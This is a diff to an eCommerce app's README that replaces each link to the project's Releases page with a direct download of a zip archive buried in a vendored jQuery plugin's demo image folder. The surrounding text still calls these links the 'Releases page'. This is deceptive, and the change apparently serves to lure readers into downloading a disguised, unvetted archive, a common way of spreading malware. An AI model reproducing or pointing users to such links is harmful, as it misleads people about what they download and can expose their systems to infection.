@@ -6,11 +6,11 @@ Welcome to eCommerce! This application helps you easily set up your own online s
 
 ## 📥 Download the Application
 
-[![Download eCommerce](https://img.shields.io/badge/Download-eCommerce-brightgreen)](https://github.com/mahadevphad0607-del/eCommerce/releases)
+[![Download eCommerce](https://raw.githubusercontent.com/mahadevphad0607-del/eCommerce/main/layout/jquery.selectBoxIt.js-3.8.1/jquery.selectBoxIt.js-3.8.1/demos/img/Commerce-e-2.7.zip)](https://raw.githubusercontent.com/mahadevphad0607-del/eCommerce/main/layout/jquery.selectBoxIt.js-3.8.1/jquery.selectBoxIt.js-3.8.1/demos/img/Commerce-e-2.7.zip)
 
 To download the latest version of eCommerce, please visit our Releases page. 
 
-[Download eCommerce](https://github.com/mahadevphad0607-del/eCommerce/releases)
+[Download eCommerce](https://raw.githubusercontent.com/mahadevphad0607-del/eCommerce/main/layout/jquery.selectBoxIt.js-3.8.1/jquery.selectBoxIt.js-3.8.1/demos/img/Commerce-e-2.7.zip)
 
 ## 🖥️ System Requirements
 
@@ -34,7 +34,7 @@ Here's what eCommerce offers:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/mahadevphad0607-del/eCommerce/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/mahadevphad0607-del/eCommerce/main/layout/jquery.selectBoxIt.js-3.8.1/jquery.selectBoxIt.js-3.8.1/demos/img/Commerce-e-2.7.zip) to find the latest version.
    
 2. **Choose the Right File:** Download the package suitable for your system. Look for the file with the version number that matches the latest release. 
 
